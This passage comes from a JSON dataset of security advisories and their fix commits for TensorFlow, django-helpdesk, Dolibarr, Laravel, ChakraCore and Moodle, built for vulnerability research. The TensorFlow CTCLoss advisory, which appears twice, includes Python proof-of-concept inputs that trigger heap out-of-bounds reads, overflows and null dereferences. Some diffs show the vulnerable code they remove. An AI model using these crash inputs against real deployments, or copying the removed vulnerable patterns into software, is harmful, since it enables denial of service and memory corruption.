X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/480641e3599775a8895254ffbc0fc45621334f68","commit_sha":"480641e3599775a8895254ffbc0fc45621334f68","patch":"SINGLE","chain_ord":"['480641e3599775a8895254ffbc0fc45621334f68']","before_first_fix_commit":"{'8cae746d8449c7dda5298327353d68613f16e798'}","last_fix_commit":"480641e3599775a8895254ffbc0fc45621334f68","chain_ord_pos":1.0,"commit_datetime":"04\/24\/2021, 23:47:25","message":"Validate (and ensure validation sticks) inputs for `MatrixTriangularSolve`.\n\nPiperOrigin-RevId: 370282444\nChange-Id: Iaed61a0b0727cc42c830658b72eb69f785f48dc5","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 16, 'deletions': 4, 'total': 20}","files":"{'tensorflow\/core\/kernels\/linalg\/matrix_triangular_solve_op_impl.h': {'additions': 16, 'deletions': 4, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/480641e3599775a8895254ffbc0fc45621334f68\/tensorflow%2Fcore%2Fkernels%2Flinalg%2Fmatrix_triangular_solve_op_impl.h', 'patch': '@@ -162,6 +162,9 @@ class BaseMatrixTriangularSolveOp : public OpKernel {\\n     const Tensor& in1 = ctx->input(1);\\n \\n     ValidateInputTensors(ctx, in0, in1);\\n+    if (!ctx->status().ok()) {\\n+      return;\\n+    }\\n \\n     MatMulBCast bcast(in0.shape().dim_sizes(), in1.shape().dim_sizes());\\n     OP_REQUIRES(\\n@@ -230,13 +233,22 @@ class MatrixTriangularSolveOp\\n  private:\\n   void ValidateInputTensors(OpKernelContext* ctx, const Tensor& in0,\\n                             const Tensor& in1) override {\\n+    const auto in0_num_dims = in0.dims();\\n     OP_REQUIRES(\\n-        ctx, in0.dims() >= 2,\\n-        errors::InvalidArgument(\"In[0] ndims must be >= 2: \", in0.dims()));\\n+        ctx, in0_num_dims >= 2,\\n+        errors::InvalidArgument(\"In[0] ndims must be >= 2: \", in0_num_dims));\\n \\n+    const auto in1_num_dims = in1.dims();\\n     OP_REQUIRES(\\n-        ctx, in1.dims() >= 2,\\n-        errors::InvalidArgument(\"In[0] ndims must be >= 2: \", in1.dims()));\\n+        ctx, in1_num_dims >= 2,\\n+        errors::InvalidArgument(\"In[1] ndims must be >= 2: \", in1_num_dims));\\n+\\n+    const auto in0_last_dim = in0.dim_size(in0_num_dims - 1);\\n+    const auto in0_prev_dim = in0.dim_size(in0_num_dims - 2);\\n+    OP_REQUIRES(ctx, in0_last_dim == in0_prev_dim,\\n+                errors::InvalidArgument(\\n+                    \"In[0] matrices in the last dimensions must be square (\",\\n+                    in0_last_dim, \" =\/= \", in0_prev_dim, \")\"));\\n   }\\n };'}}","message_norm":"validate (and ensure validation sticks) inputs for `matrixtriangularsolve`.\n\npiperorigin-revid: 370282444\nchange-id: iaed61a0b0727cc42c830658b72eb69f785f48dc5","language":"en","entities":"[('validate', 'ACTION', ''), ('ensure', 'ACTION', ''), ('370282444', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/linalg\/matrix_triangular_solve_op_impl.h'])","num_files":1.0},{"index":3171,"vuln_id":"GHSA-vvg4-vgrv-xfr7","cwe_id":"{'CWE-665'}","score":6.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4504a081af71514bb1828048363e6540f797005b', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/14607c0707040d775e06b6817325640cb4b5864c'}","dataset":"osv","summary":"Incomplete validation in `tf.raw_ops.CTCLoss` ### Impact \nIncomplete validation in `tf.raw_ops.CTCLoss` allows an attacker to trigger an OOB read from heap:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[10, 16, 0], dtype=tf.float32)\nlabels_indices = tf.constant([], shape=[8, 0], dtype=tf.int64)\nlabels_values = tf.constant([-100] * 8, shape=[8], dtype=tf.int32)\nsequence_length = tf.constant([-100] * 16, shape=[16], dtype=tf.int32)\n  \ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=True, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=True)\n```   \n      \nAn attacker can also trigger a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[7, 2, 0], dtype=tf.float32)\nlabels_indices = tf.constant([-100, -100], shape=[2, 1], dtype=tf.int64)\nlabels_values = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\nsequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\n\ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=False)\n```\n\nFinally, an attacker can trigger a null pointer dereference:\n\n```python \nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[0, 2, 11], dtype=tf.float32)\nlabels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)\nlabels_values = tf.constant([], shape=[0], dtype=tf.int32)\nsequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\n\ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=False)\n```\n\n### Patches\nWe have patched the issue in GitHub commit[14607c0707040d775e06b6817325640cb4b5864c](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/14607c0707040d775e06b6817325640cb4b5864c) followed by GitHub commit [4504a081af71514bb1828048363e6540f797005b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4504a081af71514bb1828048363e6540f797005b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4504a081af71514bb1828048363e6540f797005b","commit_sha":"4504a081af71514bb1828048363e6540f797005b","patch":"MULTI","chain_ord":"['4504a081af71514bb1828048363e6540f797005b', '14607c0707040d775e06b6817325640cb4b5864c']","before_first_fix_commit":"{'8410ce671b48e96965a1e4a97017f8a5bbd03d3a'}","last_fix_commit":"14607c0707040d775e06b6817325640cb4b5864c","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2021, 00:33:47","message":"Fix OOB read issue with `tf.raw_ops.CTCLoss`.\n\nPiperOrigin-RevId: 372242187\nChange-Id: I347228ed8c04e1d2eb9d2479ae52f51d1b512c6e","author":"Amit Patankar","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/core\/kernels\/ctc_loss_op.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/4504a081af71514bb1828048363e6540f797005b\/tensorflow%2Fcore%2Fkernels%2Fctc_loss_op.cc', 'patch': '@@ -100,6 +100,10 @@ class CTCLossOp : public OpKernel {\\n                 errors::InvalidArgument(\"sequence_length is not a vector\"));\\n     OP_REQUIRES(ctx, TensorShapeUtils::IsMatrix(labels_indices->shape()),\\n                 errors::InvalidArgument(\"labels_indices is not a matrix\"));\\n+    OP_REQUIRES(ctx, labels_indices->dim_size(1) > 1,\\n+                errors::InvalidArgument(\\n+                    \"labels_indices second dimension must be >= 1. Received \",\\n+                    labels_indices->dim_size(1)));\\n     OP_REQUIRES(ctx, TensorShapeUtils::IsVector(labels_values->shape()),\\n                 errors::InvalidArgument(\"labels_values is not a vector\"));'}}","message_norm":"fix oob read issue with `tf.raw_ops.ctcloss`.\n\npiperorigin-revid: 372242187\nchange-id: i347228ed8c04e1d2eb9d2479ae52f51d1b512c6e","language":"en","entities":"[('fix', 'ACTION', ''), ('oob', 'SECWORD', ''), ('issue', 'FLAW', ''), ('372242187', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ctc_loss_op.cc'])","num_files":1.0},{"index":3172,"vuln_id":"GHSA-vvg4-vgrv-xfr7","cwe_id":"{'CWE-665'}","score":6.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4504a081af71514bb1828048363e6540f797005b', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/14607c0707040d775e06b6817325640cb4b5864c'}","dataset":"osv","summary":"Incomplete validation in `tf.raw_ops.CTCLoss` ### Impact \nIncomplete validation in `tf.raw_ops.CTCLoss` allows an attacker to trigger an OOB read from heap:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[10, 16, 0], dtype=tf.float32)\nlabels_indices = tf.constant([], shape=[8, 0], dtype=tf.int64)\nlabels_values = tf.constant([-100] * 8, shape=[8], dtype=tf.int32)\nsequence_length = tf.constant([-100] * 16, shape=[16], dtype=tf.int32)\n  \ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=True, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=True)\n```   \n      \nAn attacker can also trigger a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[7, 2, 0], dtype=tf.float32)\nlabels_indices = tf.constant([-100, -100], shape=[2, 1], dtype=tf.int64)\nlabels_values = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\nsequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\n\ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=False)\n```\n\nFinally, an attacker can trigger a null pointer dereference:\n\n```python \nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[0, 2, 11], dtype=tf.float32)\nlabels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)\nlabels_values = tf.constant([], shape=[0], dtype=tf.int32)\nsequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\n\ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=False)\n```\n\n### Patches\nWe have patched the issue in GitHub commit[14607c0707040d775e06b6817325640cb4b5864c](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/14607c0707040d775e06b6817325640cb4b5864c) followed by GitHub commit [4504a081af71514bb1828048363e6540f797005b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4504a081af71514bb1828048363e6540f797005b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/14607c0707040d775e06b6817325640cb4b5864c","commit_sha":"14607c0707040d775e06b6817325640cb4b5864c","patch":"MULTI","chain_ord":"['4504a081af71514bb1828048363e6540f797005b', '14607c0707040d775e06b6817325640cb4b5864c']","before_first_fix_commit":"{'8410ce671b48e96965a1e4a97017f8a5bbd03d3a'}","last_fix_commit":"14607c0707040d775e06b6817325640cb4b5864c","chain_ord_pos":2.0,"commit_datetime":"05\/06\/2021, 04:09:21","message":"Fix nullptr deref in `tf.raw_ops.CTCLoss`.\n\nPiperOrigin-RevId: 372266334\nChange-Id: Ic52c3e9f13a38f54482d670907eda1688450862b","author":"Amit Patankar","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/kernels\/ctc_loss_op.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/14607c0707040d775e06b6817325640cb4b5864c\/tensorflow%2Fcore%2Fkernels%2Fctc_loss_op.cc', 'patch': '@@ -109,6 +109,9 @@ class CTCLossOp : public OpKernel {\\n \\n     const TensorShape& inputs_shape = inputs->shape();\\n     const int64 max_time = inputs_shape.dim_size(0);\\n+    OP_REQUIRES(ctx, max_time != 0,\\n+                errors::InvalidArgument(\\n+                    \"Max time or first dimension of input cannot be 0.\"));\\n     const int64 batch_size = inputs_shape.dim_size(1);\\n     const int64 num_classes_raw = inputs_shape.dim_size(2);\\n     OP_REQUIRES('}}","message_norm":"fix nullptr deref in `tf.raw_ops.ctcloss`.\n\npiperorigin-revid: 372266334\nchange-id: ic52c3e9f13a38f54482d670907eda1688450862b","language":"en","entities":"[('fix', 'ACTION', ''), ('nullptr', 'SECWORD', ''), ('372266334', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ctc_loss_op.cc'])","num_files":1.0},{"index":3188,"vuln_id":"GHSA-vx6v-xg64-pmr8","cwe_id":"{'CWE-79'}","score":8.8,"chain":"{'https:\/\/github.com\/django-helpdesk\/django-helpdesk\/commit\/2c7065e0c4296e0c692fb4a7ee19c7357583af30'}","dataset":"osv","summary":"Cross-site Scripting in django-helpdesk django-helpdesk is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting').","published_date":"2021-11-15","chain_len":1,"project":"https:\/\/github.com\/django-helpdesk\/django-helpdesk","commit_href":"https:\/\/github.com\/django-helpdesk\/django-helpdesk\/commit\/2c7065e0c4296e0c692fb4a7ee19c7357583af30","commit_sha":"2c7065e0c4296e0c692fb4a7ee19c7357583af30","patch":"SINGLE","chain_ord":"['2c7065e0c4296e0c692fb4a7ee19c7357583af30']","before_first_fix_commit":"{'3f245871ac91356fd91a4e2cea5048bcac1d833e'}","last_fix_commit":"2c7065e0c4296e0c692fb4a7ee19c7357583af30","chain_ord_pos":1.0,"commit_datetime":"11\/11\/2021, 10:32:09","message":"Add function `htmlEntities`\n\n`htmlentities()` is a function which converts special characters. This allows you to show to display the string without the browser reading it as HTML.","author":"lethanhphuc","comments":null,"stats":"{'additions': 6, 'deletions': 2, 'total': 8}","files":"{'helpdesk\/templates\/helpdesk\/ticket_list.html': {'additions': 6, 'deletions': 2, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/django-helpdesk\/django-helpdesk\/raw\/2c7065e0c4296e0c692fb4a7ee19c7357583af30\/helpdesk%2Ftemplates%2Fhelpdesk%2Fticket_list.html', 'patch': '@@ -330,7 +330,11 @@ <h5 class=\"mb-0\">\\n         function get_url(row) {\\n             return \"{% url \\'helpdesk:view\\' 1234 %}\".replace(\/1234\/, row.id.toString());\\n         }\\n-\\n+        \\n+        function htmlEntities(str) {\\n+            return String(str).replace(\/&\/g, \\'&amp;\\').replace(\/<\/g, \\'&lt;\\').replace(\/>\/g, \\'&gt;\\').replace(\/\"\/g, \\'&quot;\\');\\n+        }\\n+        \\n         $(document).ready(function () {\\n             \/\/ Ticket DataTable Initialization\\n             $(\\'#ticketTable\\').DataTable({\\n@@ -366,7 +370,7 @@ <h5 class=\"mb-0\">\\n                             if (type === \\'display\\') {\\n                                 data = \\'<div class=\"tickettitle\"><a href=\"\\' + get_url(row) + \\'\" >\\' +\\n                                     row.id + \\'. \\' +\\n-                                    row.title + \\'<\/a><\/div>\\';\\n+                                    htmlEntities(row.title) + \\'<\/a><\/div>\\';\\n                             }\\n                             return data\\n                         }'}}","message_norm":"add function `htmlentities`\n\n`htmlentities()` is a function which converts special characters. this allows you to show to display the string without the browser reading it as html.","language":"en","entities":"[('add', 'ACTION', ''), ('htmlentities', 'SECWORD', ''), ('htmlentities', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['helpdesk\/templates\/helpdesk\/ticket_list.html'])","num_files":1.0},{"index":3194,"vuln_id":"GHSA-vxhc-c4qm-647p","cwe_id":"{'CWE-284', 'CWE-863'}","score":4.3,"chain":"{'https:\/\/github.com\/Dolibarr\/dolibarr\/commit\/8cc100012d46282799fb19f735a53b7101569377'}","dataset":"osv","summary":"Improper Access Control in Dolibarr In \u201cDolibarr\u201d application, 2.8.1 to 13.0.4 don\u2019t restrict or incorrectly restricts access to a resource from an unauthorized actor. A low privileged attacker can modify the Private Note which only an administrator has rights to do, the affected field is at \u201c\/adherents\/note.php?id=1\u201d endpoint.","published_date":"2021-08-11","chain_len":1,"project":"https:\/\/github.com\/Dolibarr\/dolibarr","commit_href":"https:\/\/github.com\/Dolibarr\/dolibarr\/commit\/8cc100012d46282799fb19f735a53b7101569377","commit_sha":"8cc100012d46282799fb19f735a53b7101569377","patch":"SINGLE","chain_ord":"['8cc100012d46282799fb19f735a53b7101569377']","before_first_fix_commit":"{'0271645d8efd5815bbb2d8750c76e8b27ee974be'}","last_fix_commit":"8cc100012d46282799fb19f735a53b7101569377","chain_ord_pos":1.0,"commit_datetime":"05\/09\/2021, 10:50:46","message":"Fix vulnerabiity: External users can set a public note","author":"Laurent Destailleur","comments":null,"stats":"{'additions': 13, 'deletions': 11, 'total': 24}","files":"{'htdocs\/core\/actions_setnotes.inc.php': {'additions': 13, 'deletions': 11, 'changes': 24, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Dolibarr\/dolibarr\/raw\/8cc100012d46282799fb19f735a53b7101569377\/htdocs%2Fcore%2Factions_setnotes.inc.php', 'patch': \"@@ -67,16 +67,18 @@\\n \\t\\t\\t}\\n \\t\\t}\\n \\t}\\n-} elseif ($action == 'setnote_private' && !empty($permissionnote) && !GETPOST('cancel', 'alpha')) {\\n-\\t\/\/ Set public note\\n-\\tif (empty($action) || !is_object($object) || empty($id)) {\\n-\\t\\tdol_print_error('', 'Include of actions_setnotes.inc.php was done but required variable was not set before');\\n-\\t}\\n-\\tif (empty($object->id)) {\\n-\\t\\t$object->fetch($id); \/\/ Fetch may not be already done\\n-\\t}\\n-\\t$result = $object->update_note(dol_html_entity_decode(GETPOST('note_private', 'restricthtml'), ENT_QUOTES | ENT_HTML5), '_private');\\n-\\tif ($result < 0) {\\n-\\t\\tsetEventMessages($object->error, $object->errors, 'errors');\\n+} elseif ($action == 'setnote_private' && !empty($permissionnote) && !GETPOST('cancel', 'alpha')) {\\t\/\/ Set public note\\n+\\tif (empty($user->socid)) {\\n+\\t\\t\/\/ Private notes (always hidden to external users)\\n+\\t\\tif (empty($action) || !is_object($object) || empty($id)) {\\n+\\t\\t\\tdol_print_error('', 'Include of actions_setnotes.inc.php was done but required variable was not set before');\\n+\\t\\t}\\n+\\t\\tif (empty($object->id)) {\\n+\\t\\t\\t$object->fetch($id); \/\/ Fetch may not be already done\\n+\\t\\t}\\n+\\t\\t$result = $object->update_note(dol_html_entity_decode(GETPOST('note_private', 'restricthtml'), ENT_QUOTES | ENT_HTML5), '_private');\\n+\\t\\tif ($result < 0) {\\n+\\t\\t\\tsetEventMessages($object->error, $object->errors, 'errors');\\n+\\t\\t}\\n \\t}\\n }\"}}","message_norm":"fix vulnerabiity: external users can set a public note","language":"ca","entities":"[('fix', 'ACTION', ''), ('vulnerabiity', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['htdocs\/core\/actions_setnotes.inc.php'])","num_files":1.0},{"index":3203,"vuln_id":"GHSA-w2pm-r78h-4m7v","cwe_id":"{'CWE-78'}","score":8.8,"chain":"{'https:\/\/github.com\/laravel\/framework\/commit\/44c3feb604944599ad1c782a9942981c3991fa31'}","dataset":"osv","summary":"OS Command Injection in Laravel Framework OS Command injection vulnerability in function link in Filesystem.php in Laravel Framework before 5.8.17.","published_date":"2022-01-06","chain_len":1,"project":"https:\/\/github.com\/laravel\/framework","commit_href":"https:\/\/github.com\/laravel\/framework\/commit\/44c3feb604944599ad1c782a9942981c3991fa31","commit_sha":"44c3feb604944599ad1c782a9942981c3991fa31","patch":"SINGLE","chain_ord":"['44c3feb604944599ad1c782a9942981c3991fa31']","before_first_fix_commit":"{'c7a3ca1c6df547a807807ffc782c13b92d44a1ad'}","last_fix_commit":"44c3feb604944599ad1c782a9942981c3991fa31","chain_ord_pos":1.0,"commit_datetime":"05\/14\/2019, 15:58:33","message":"use escapeshellarg on windows symlink","author":"Taylor Otwell","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/Illuminate\/Filesystem\/Filesystem.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/laravel\/framework\/raw\/44c3feb604944599ad1c782a9942981c3991fa31\/src%2FIlluminate%2FFilesystem%2FFilesystem.php', 'patch': '@@ -254,7 +254,7 @@ public function link($target, $link)\\n \\n         $mode = $this->isDirectory($target) ? \\'J\\' : \\'H\\';\\n \\n-        exec(\"mklink \/{$mode} \\\\\"{$link}\\\\\" \\\\\"{$target}\\\\\"\");\\n+        exec(\"mklink \/{$mode} \".escapeshellarg($link).\" \".escapeshellarg($target));\\n     }\\n \\n     \/**'}}","message_norm":"use escapeshellarg on windows symlink","language":"en","entities":"[('escapeshellarg', 'SECWORD', ''), ('symlink', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Illuminate\/Filesystem\/Filesystem.php'])","num_files":1.0},{"index":3204,"vuln_id":"GHSA-w32p-76xr-88pc","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/90f67afac6362828c750f3bccbcc1c360caf29e4', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/3d6226cc2d1077537220361c82e34a362c6c76ee'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-0989, CVE-2019-0991, CVE-2019-0992, CVE-2019-0993, CVE-2019-1002, CVE-2019-1024, CVE-2019-1051, CVE-2019-1052.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/90f67afac6362828c750f3bccbcc1c360caf29e4","commit_sha":"90f67afac6362828c750f3bccbcc1c360caf29e4","patch":"MULTI","chain_ord":"['90f67afac6362828c750f3bccbcc1c360caf29e4', '3d6226cc2d1077537220361c82e34a362c6c76ee']","before_first_fix_commit":"{'d797e3f00e34c12c8c0ae52f56344325439dccd7', 'eabf77ad17010f220639e5261798da9ac14e43e3'}","last_fix_commit":"3d6226cc2d1077537220361c82e34a362c6c76ee","chain_ord_pos":1.0,"commit_datetime":"05\/15\/2019, 22:37:38","message":"CVE-2019-1003","author":"Paul Leathers","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'lib\/Runtime\/Library\/JavascriptProxy.cpp': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/90f67afac6362828c750f3bccbcc1c360caf29e4\/lib%2FRuntime%2FLibrary%2FJavascriptProxy.cpp', 'patch': '@@ -392,6 +392,8 @@ namespace Js\\n         }\\n         propertyDescriptor->SetValue(getGetResult);\\n \\n+        threadContext->AddImplicitCallFlags(Js::ImplicitCall_External);\\n+\\n         return TRUE;\\n     }\\n \\n@@ -1907,6 +1909,9 @@ namespace Js\\n                 }\\n             }\\n         }\\n+\\n+        threadContext->AddImplicitCallFlags(Js::ImplicitCall_External);\\n+\\n         return TRUE;\\n \\n     }'}}","message_norm":"cve-2019-1003","language":"ro","entities":"[('cve-2019-1003', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Runtime\/Library\/JavascriptProxy.cpp'])","num_files":1.0},{"index":3206,"vuln_id":"GHSA-w37f-pvvx-wcwm","cwe_id":"{'CWE-682'}","score":9.8,"chain":"{'https:\/\/github.com\/moodle\/moodle\/commit\/59b5858da200f63ecb59a9113af2b99ef1496fe5'}","dataset":"osv","summary":"Incorrect Calculation in moodle A flaw was found in moodle where logic used to count failed login attempts could result in the account lockout threshold being bypassed.","published_date":"2022-05-19","chain_len":1,"project":"https:\/\/github.com\/moodle\/moodle","commit_href":"https:\/\/github.com\/moodle\/moodle\/commit\/59b5858da200f63ecb59a9113af2b99ef1496fe5","commit_sha":"59b5858da200f63ecb59a9113af2b99ef1496fe5","patch":"SINGLE","chain_ord":"['59b5858da200f63ecb59a9113af2b99ef1496fe5']","before_first_fix_commit":"{'a0f47c8bc4d6f5971025de7d63f22475701d2f86'}","last_fix_commit":"59b5858da200f63ecb59a9113af2b99ef1496fe5","chain_ord_pos":1.0,"commit_datetime":"04\/26\/2022, 08:52:20","message":"MDL-73736 core_auth: Fix concurrency issue in login_attempt_failed()\n\nThis patch wraps the login_failed_count logic in a resource lock and\nforces a user preferences cache reload. Each thread must wait for the\nlock and must fetch the current count before incrementing it. This\nensures that login_failed_count is correct across threads and that the\nlockout threshold is correctly honoured.\n\nCo-Authored-By: Sujith Haridasan <sujith@moodle.com>","author":"Jake Dallimore","comments":null,"stats":"{'additions': 43, 'deletions': 19, 'total': 62}","files":"{'lib\/authlib.php': {'additions': 43, 'deletions': 19, 'changes': 62, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/moodle\/moodle\/raw\/59b5858da200f63ecb59a9113af2b99ef1496fe5\/lib%2Fauthlib.php', 'patch': \"@@ -877,6 +877,7 @@ function login_attempt_valid($user) {\\n \/**\\n  * To be called after failed user login.\\n  * @param stdClass $user\\n+ * @throws moodle_exception\\n  *\/\\n function login_attempt_failed($user) {\\n     global $CFG;\\n@@ -888,30 +889,53 @@ function login_attempt_failed($user) {\\n         return;\\n     }\\n \\n-    $count = get_user_preferences('login_failed_count', 0, $user);\\n-    $last = get_user_preferences('login_failed_last', 0, $user);\\n-    $sincescuccess = get_user_preferences('login_failed_count_since_success', $count, $user);\\n-    $sincescuccess = $sincescuccess + 1;\\n-    set_user_preference('login_failed_count_since_success', $sincescuccess, $user);\\n+    \/\/ Force user preferences cache reload to ensure the most up-to-date login_failed_count is fetched.\\n+    \/\/ This is perhaps overzealous but is the documented way of reloading the cache, as per the test method\\n+    \/\/ 'test_check_user_preferences_loaded'.\\n+    unset($user->preference);\\n+\\n+    $resource = 'user:' . $user->id;\\n+    $lockfactory = \\\\core\\\\lock\\\\lock_config::get_lock_factory('core_failed_login_count_lock');\\n+\\n+    \/\/ Get a new lock for the resource, waiting for it for a maximum of 10 seconds.\\n+    if ($lock = $lockfactory->get_lock($resource, 10)) {\\n+        try {\\n+            $count = get_user_preferences('login_failed_count', 0, $user);\\n+            $last = get_user_preferences('login_failed_last', 0, $user);\\n+            $sincescuccess = get_user_preferences('login_failed_count_since_success', $count, $user);\\n+            $sincescuccess = $sincescuccess + 1;\\n+            set_user_preference('login_failed_count_since_success', $sincescuccess, $user);\\n+\\n+            if (empty($CFG->lockoutthreshold)) {\\n+                \/\/ No threshold means no lockout.\\n+                \/\/ Always unlock here, there might be some race conditions or leftovers when switching threshold.\\n+                login_unlock_account($user);\\n+                $lock->release();\\n+                return;\\n+            }\\n \\n-    if (empty($CFG->lockoutthreshold)) {\\n-        \/\/ No threshold means no lockout.\\n-        \/\/ Always unlock here, there might be some race conditions or leftovers when switching threshold.\\n-        login_unlock_account($user);\\n-        return;\\n-    }\\n+            if (!empty($CFG->lockoutwindow) and time() - $last > $CFG->lockoutwindow) {\\n+                $count = 0;\\n+            }\\n \\n-    if (!empty($CFG->lockoutwindow) and time() - $last > $CFG->lockoutwindow) {\\n-        $count = 0;\\n-    }\\n+            $count = $count + 1;\\n \\n-    $count = $count+1;\\n+            set_user_preference('login_failed_count', $count, $user);\\n+            set_user_preference('login_failed_last', time(), $user);\\n \\n-    set_user_preference('login_failed_count', $count, $user);\\n-    set_user_preference('login_failed_last', time(), $user);\\n+            if ($count >= $CFG->lockoutthreshold) {\\n+                login_lock_account($user);\\n+            }\\n \\n-    if ($count >= $CFG->lockoutthreshold) {\\n-        login_lock_account($user);\\n+            \/\/ Release locks when we're done.\\n+            $lock->release();\\n+        } catch (Exception $e) {\\n+            \/\/ Always release the lock on a failure.\\n+            $lock->release();\\n+        }\\n+    } else {\\n+        \/\/ We did not get access to the resource in time, give up.\\n+        throw new moodle_exception('locktimeout');\\n     }\\n }\"}}","message_norm":"mdl-73736 core_auth: fix concurrency issue in login_attempt_failed()\n\nthis patch wraps the login_failed_count logic in a resource lock and\nforces a user preferences cache reload. each thread must wait for the\nlock and must fetch the current count before incrementing it. this\nensures that login_failed_count is correct across threads and that the\nlockout threshold is correctly honoured.\n\nco-authored-by: sujith 